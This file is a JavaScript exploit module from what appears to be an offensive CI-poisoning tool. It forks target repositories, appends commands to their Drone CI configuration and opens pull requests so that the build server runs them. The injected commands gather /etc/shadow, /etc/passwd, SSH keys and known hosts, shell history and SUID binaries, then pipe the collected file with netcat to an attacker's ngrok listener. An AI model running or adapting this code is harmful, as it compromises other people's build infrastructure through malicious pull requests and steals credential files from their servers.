const log = console.log,
  chalk = require('chalk'),
  green = chalk.green,
  cyan = chalk.cyan,
  ngrok = require('ngrok'),
  github = require(__dirname + '/../../../lib/gh'),
  files = require(__dirname + '/../../../lib/files'),
  repos = require(__dirname + '/../../../lib/repos'),
  exp = require(__dirname + '/../../../lib/exp'),
  drone = require(__dirname + '/../../../modules/drone'),
  server = require(__dirname + '/../../../lib/server'),
  ng = require(__dirname + '/../../../lib/ng'),
  targets = require(__dirname + '/../../../lib/targets'),
  repodir = __dirname + '/../../../../repos';

module.exports = {

  // This particular run function returns an array of netcat listeners
  run: (callback) => {
    exp.exploitSingleHarness('github', 'other', module.exports.type(), module.exports.name(), (err, token, authed_user, raw_targets, ci_targets, nc, duplex, nc_port, hostname, ng_port, ng_server, ng_url) => {
      if (err) {
        log(err);
        return callback();
      } else {
        // Load the .drone.yml file into the repos
        drone.loadDroneConfigAll(module.exports.name(), authed_user, raw_targets, () => {
          const append_promises = [];

          // iterate through list of files, find drone configs and append to the file
          for (let t in raw_targets) {
            append_promises.push(new Promise((resolve, reject) => {
              drone.appendDroneConfig(`${repodir}/${raw_targets[t]}/.drone.yml`, module.exports.injectionString(ng_port, hostname));
              resolve();
            }).catch(err => {
              reject();
              log(err);
            }));
          }

          // Cash in the promises from above
          Promise.all(append_promises)
            .then(c => {
              log(chalk.green("Making pull requests..."));
              repos.pullRequestAll(token, 'other', authed_user, raw_targets, () => {
                let cbcount = 0;
                log(chalk.green("Wating for basic recon scan to complete. Sit tight."));
                duplex.pipe(process.stdout);
                nc.on('data', (info, msg) => {
                  if (msg.toString('utf8').includes("ciderdone")) {
                    cbcount++;
                    if (cbcount >= raw_targets.length) {
                      log(chalk.green("Basic recon scan complete."));
                      duplex.unpipe(process.stdout);
                      nc.close();
                      ngrok.disconnect(ng_url);
                      return callback();
                    }
                  }
                });
              });
            }).catch(e => {
              if (e) {
                log(e);
              }
            });
        });
      }
    })
  },

  name: () => {
    return "drone/recon_verbose";
  },

  type: () => {
    return "drone";
  },

  info: (cb) => {
    log(cyan("---\nINFO\n---\n"));
    log((`This exploit takes advantage of open drone-CI repositories to 
create run some basic recon against the build server. This includes multitude of information gathering commands.\n
It can be run against many targets, but you probably want to only run it against one.\n`));

    log(cyan("ORDER OF EXECUTION\n------------------\n"));
    log(("1) Clone all forked targets locally. Drone can't handle PRs from forke repos"));
    log(("2) Start single shell handler"));
    log(("3) Load and poison the .drone.yml file of the cloned repos"));
    log(("4) Push commited changes, and submit a pull request"));
    log(("5) Listen for incoming messages. Close connection once executed."));
    return cb();
    // Print information about the exploit
  },


  injectionString: (ng_port, hostname) => {
    return `\n      - export NGPORT=${ng_port}\n      \
- export NGHOSTNAME=${hostname}\n      \
- apt-get update && apt-get install -y netcat apt-utils net-tools curl\n      \
- touch /tmp/cider_out\n      \
- set +e\n      \
- uname -a >> /tmp/cider_out\n      \
- curl ipecho.net/plain; echo >> /tmp/cider_out\n      \
- netstat -la >> /tmp/cider_out\n      \
- cat /etc/hosts >> /tmp/cider_out\n      \
- cat /etc/resolv.conf >> /tmp/cider_out\n      \
- ls -alh ~/ >> /tmp/cider_out\n      \
- ls -alh ~/.ssh/ >> /tmp/cider_out\n      \
- cat ~/.ssh/authorized_keys >> /tmp/cider_out\n      \
- cat ~/.ssh/known_hosts >> /tmp/cider_out\n      \
- cat ~/.hist >> /tmp/cider_out\n      \
- cat /etc/issue >> /tmp/cider_out\n      \
- cat /etc/shadow >> /tmp/cider_out\n      \
- cat /etc/passwd >> /tmp/cider_out\n      \
- crontab -l >> /tmp/cider_out\n      \
- find / -perm -4000 >> /tmp/cider_out\n      \
- mount >> /tmp/cider_out\n      \
- last >> /tmp/cider_out\n      \
- id >> /tmp/cider_out\n      \
- whoami >> /tmp/cider_out\n      \
- ifconfig >> /tmp/cider_out\n      \
- cat /proc/cpuinfo >> /tmp/cider_out\n      \
- cat /proc/meminfo >> /tmp/cider_out\n      \
- echo "ciderdone" >> /tmp/cider_out\n      \
- nc $NGHOSTNAME $NGPORT < /tmp/cider_out\n      \
- exit 1`;
  },


  options: () => {
    log(green("\n-------\nOPTIONS\n-------\n"));
    log(green("NO OPTIONS. This is the 'easy' exploit. No need to set IPs or ports."));
  }
}